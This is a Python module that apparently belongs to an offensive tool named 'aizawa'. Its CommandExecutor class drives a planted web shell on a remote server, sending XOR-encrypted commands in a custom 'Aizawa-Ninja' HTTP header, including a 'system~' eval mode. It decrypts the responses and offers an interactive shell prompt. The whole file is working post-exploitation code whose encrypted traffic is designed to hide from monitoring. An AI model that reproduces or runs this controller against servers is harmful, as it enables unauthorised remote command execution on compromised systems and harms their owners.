"""Command execution with XOR encryption support."""

from __future__ import annotations

import asyncio
import os
from typing import TYPE_CHECKING

from aizawa.utils.terminal import TerminalColors

if TYPE_CHECKING:
    from aizawa.http.client import AsyncHttpClient


class CommandExecutor:
    """Execute encrypted commands through HTTP headers."""

    @staticmethod
    def encrypt_with_xor(plaintext: str, encryption_key: str) -> str:
        """Encrypt data using XOR cipher with random IV.

        Args:
            plaintext: Data to encrypt.
            encryption_key: Encryption key for XOR operation.

        Returns:
            Hex-encoded encrypted string with prepended IV.

        """
        iv = os.urandom(16)
        data = plaintext.encode('utf-8')
        key = encryption_key.encode('utf-8')
        offset = iv[0]

        encrypted = b''
        for i in range(len(data)):
            k = key[(i + offset) % len(key)]
            encrypted += bytes([data[i] ^ k ^ iv[i % 16]])

        return (iv + encrypted).hex()

    @staticmethod
    def decrypt_with_xor(ciphertext: str, decryption_key: str) -> str:
        """Decrypt XOR-encrypted hex string with IV.

        Args:
            ciphertext: Hex-encoded encrypted data with prepended IV.
            decryption_key: Decryption key for XOR operation.

        Returns:
            Decrypted plaintext string.

        """
        data = bytes.fromhex(ciphertext)
        iv = data[:16]
        encrypted = data[16:]
        key = decryption_key.encode('utf-8')
        offset = iv[0]

        decrypted = b''
        for i in range(len(encrypted)):
            k = key[(i + offset) % len(key)]
            decrypted += bytes([encrypted[i] ^ k ^ iv[i % 16]])

        return decrypted.decode('utf-8')

    @staticmethod
    async def run_command(
        client: AsyncHttpClient,
        url: str,
        command: str,
        shell_type: str,
        key: str,
    ) -> str | None:
        """Execute a command on the remote shell.

        Args:
            client: HTTP client for requests.
            url: Target shell URL.
            command: Command to execute.
            shell_type: Type of shell endpoint.
            key: Encryption key for secure transmission.

        Returns:
            Command output if successful, None otherwise.

        """
        if not shell_type.startswith("http_aizawa_ninja"):
            return None

        encrypted_cmd = (
            CommandExecutor.encrypt_with_xor(f"system~{command}", key)
            if shell_type == "http_aizawa_ninja_eval"
            else CommandExecutor.encrypt_with_xor(command, key)
        )

        headers = {"Aizawa-Ninja": encrypted_cmd}
        result = await client.send_request("GET", url, headers=headers)

        if not result:
            return f"{TerminalColors.RED}ERROR{TerminalColors.CLEAR}"

        if all(c in "0123456789abcdefABCDEF" for c in result.strip()):
            try:
                return CommandExecutor.decrypt_with_xor(result, key)
            except ValueError:
                return result

        return result

    @staticmethod
    async def interactive_shell(
        client: AsyncHttpClient,
        url: str,
        shell_type: str,
        username: str,
        hostname: str,
        working_dir: str,
        key: str,
    ) -> None:
        """Run interactive command shell with styled prompt.

        Args:
            client: HTTP client for requests.
            url: Target shell URL.
            shell_type: Type of shell endpoint.
            username: Current user name.
            hostname: Current hostname.
            working_dir: Current working directory.
            key: Encryption key for commands.

        """
        while True:
            try:
                prompt = (
                    f"\n{TerminalColors.BOLD}{TerminalColors.YELLOW}{username}{TerminalColors.CLEAR}@"
                    f"{TerminalColors.BOLD}{TerminalColors.BLUE}{hostname}{TerminalColors.CLEAR} "
                    f"{TerminalColors.PURPLE}{working_dir}{TerminalColors.CLEAR} % "
                )
                cmd = input(prompt)

                if cmd in {"exit", "quit"}:
                    print(
                        f"{TerminalColors.BOLD}{TerminalColors.RED}Exiting...{TerminalColors.CLEAR}",
                    )
                    return

                if not cmd:
                    continue

                result = await CommandExecutor.run_command(
                    client, url, cmd, shell_type, key,
                )
                print(f"\n{TerminalColors.CYAN}{result}{TerminalColors.CLEAR}")
            except (KeyboardInterrupt, EOFError, asyncio.CancelledError):
                print(
                    f"\n{TerminalColors.BOLD}{TerminalColors.RED}Exiting...{TerminalColors.CLEAR}",
                )
                return
